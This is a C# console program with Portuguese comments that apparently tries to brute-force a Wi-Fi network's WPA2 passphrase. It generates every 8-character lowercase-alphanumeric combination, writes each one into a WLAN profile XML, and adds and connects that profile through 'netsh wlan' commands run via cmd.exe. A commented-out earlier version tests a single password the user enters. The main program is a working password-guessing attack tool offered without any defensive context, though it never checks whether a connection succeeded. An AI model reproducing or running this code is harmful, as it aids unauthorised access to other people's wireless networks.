using System;
using System.Diagnostics;
using System.Collections.Generic;
using System.Threading;

using System;
using System.Collections.Generic;
using System.Diagnostics;

class Program
{
    static void Main()
    {
        // Solicitar ao usuário o SSID da rede Wi-Fi:

        Console.Write("Digite o nome da rede Wi-Fi (SSID): ");

        string ssid = Console.ReadLine();

        // Definir os caracteres e o comprimento da senha:

        char[] characters = "abcdefghijklmnopqrstuvwxyz0123456789".ToCharArray();

        int passwordLength = 8; // Defina o comprimento da senha que você quer testar

        // Gerar e testar as combinações de senha
        foreach (var password in GenerateCombinations(characters, "", passwordLength))
        {
            Console.WriteLine($"Testando senha: {password}");

            // Criar o perfil Wi-Fi com a senha gerada
            CreateWiFiProfile(ssid, password);

            // Conectar-se à rede Wi-Fi
            ConnectToWiFi(ssid);

            Thread.Sleep(10000);

        }

        Console.ReadKey();
    }

    static IEnumerable<string> GenerateCombinations(char[] characters, string prefix, int length)
    {
        if (length == 0)
        {
            yield return prefix;
        }
        else
        {
            foreach (char c in characters)
            {
                foreach (var combination in GenerateCombinations(characters, prefix + c, length - 1))
                {
                    yield return combination;
                }
            }
        }
    }

    static void CreateWiFiProfile(string ssid, string password)
    {
        string profileFilePath = "wifi_profile.xml";

        // Criar o arquivo XML com as credenciais
        System.IO.File.WriteAllText(profileFilePath,
            $"<?xml version=\"1.0\"?>\n" +
            $"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
            $"  <name>{ssid}</name>\n" +
            $"  <SSIDConfig>\n" +
            $"    <SSID>\n" +
            $"      <name>{ssid}</name>\n" +
            $"    </SSID>\n" +
            $"  </SSIDConfig>\n" +
            $"  <connectionType>ESS</connectionType>\n" +
            $"  <connectionMode>auto</connectionMode>\n" +
            $"  <MSM>\n" +
            $"    <security>\n" +
            $"      <authEncryption>\n" +
            $"        <authentication>WPA2PSK</authentication>\n" +
            $"        <encryption>AES</encryption>\n" +
            $"        <useOneX>false</useOneX>\n" +
            $"      </authEncryption>\n" +
            $"      <sharedKey>\n" +
            $"        <keyType>passPhrase</keyType>\n" +
            $"        <protected>false</protected>\n" +
            $"        <keyMaterial>{password}</keyMaterial>\n" +
            $"      </sharedKey>\n" +
            $"    </security>\n" +
            $"  </MSM>\n" +
            $"</WLANProfile>");

        // Executar o comando para adicionar o perfil
        ExecuteCommand($"netsh wlan add profile filename=\"{profileFilePath}\"");
    }

    static void ConnectToWiFi(string ssid)
    {
        // Executar o comando para se conectar à rede
        ExecuteCommand($"netsh wlan connect name=\"{ssid}\"");
    }

    static void ExecuteCommand(string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();

        // Ler a saída e a saída de erro
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        if (process.ExitCode == 0)
        {
            Console.WriteLine($"Comando executado com sucesso: {output}");
        }
        else
        {
            Console.WriteLine($"Erro ao executar o comando: {error}");
        }
    }
}

////
/*
using System.Diagnostics;

class Program
{
    static void Main()
    {
        // Solicitar ao usuário o SSID e a senha da rede Wi-Fi
        Console.Write("Digite o nome da rede Wi-Fi (SSID): ");
        string ssid = Console.ReadLine();

        Console.Write("Digite a senha da rede Wi-Fi: ");
        string password = Console.ReadLine();

        // Criar o perfil Wi-Fi com a senha fornecida
        CreateWiFiProfile(ssid, password);

        // Conectar-se à rede Wi-Fi
        ConnectToWiFi(ssid);

        // Verificar se a conexão foi bem-sucedida
        bool passwordCorrect = CheckWiFiConnectionStatus(ssid);

        if (passwordCorrect)
        {
            Console.WriteLine("Conexão bem-sucedida!");
        }
        else
        {
            Console.WriteLine("Falha na conexão. Verifique se a senha está correta.");
        }

        Console.ReadKey();
    }

    static void CreateWiFiProfile(string ssid, string password)
    {
        string profileFilePath = "wifi_profile.xml";

        // Criar o arquivo XML com as credenciais
        System.IO.File.WriteAllText(profileFilePath,
            $"<?xml version=\"1.0\"?>\n" +
            $"<WLANProfile xmlns=\"http://www.microsoft.com/networking/WLAN/profile/v1\">\n" +
            $"  <name>{ssid}</name>\n" +
            $"  <SSIDConfig>\n" +
            $"    <SSID>\n" +
            $"      <name>{ssid}</name>\n" +
            $"    </SSID>\n" +
            $"  </SSIDConfig>\n" +
            $"  <connectionType>ESS</connectionType>\n" +
            $"  <connectionMode>auto</connectionMode>\n" +
            $"  <MSM>\n" +
            $"    <security>\n" +
            $"      <authEncryption>\n" +
            $"        <authentication>WPA2PSK</authentication>\n" +
            $"        <encryption>AES</encryption>\n" +
            $"        <useOneX>false</useOneX>\n" +
            $"      </authEncryption>\n" +
            $"      <sharedKey>\n" +
            $"        <keyType>passPhrase</keyType>\n" +
            $"        <protected>false</protected>\n" +
            $"        <keyMaterial>{password}</keyMaterial>\n" +
            $"      </sharedKey>\n" +
            $"    </security>\n" +
            $"  </MSM>\n" +
            $"</WLANProfile>");

        // Executar o comando para adicionar o perfil
        ExecuteCommand($"netsh wlan add profile filename=\"{profileFilePath}\"");
    }

    static void ConnectToWiFi(string ssid)
    {
        // Executar o comando para se conectar à rede
        ExecuteCommand($"netsh wlan connect name=\"{ssid}\"");
    }

    static bool CheckWiFiConnectionStatus(string ssid)
    {
        string command = "netsh wlan show interfaces";
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();
        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        // Verifica se a SSID correta aparece na saída do comando
        return output.Contains(ssid);
    }

    static void ExecuteCommand(string command)
    {
        var process = new Process
        {
            StartInfo = new ProcessStartInfo
            {
                FileName = "cmd.exe",
                Arguments = "/C " + command,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            }
        };

        process.Start();

        // Ler a saída e a saída de erro
        string output = process.StandardOutput.ReadToEnd();
        string error = process.StandardError.ReadToEnd();
        process.WaitForExit();

        if (process.ExitCode == 0)
        {
            Console.WriteLine($"Comando executado com sucesso: {output}");
        }
        else
        {
            Console.WriteLine($"Erro ao executar o comando: {error}");
        }
    }
}
*/
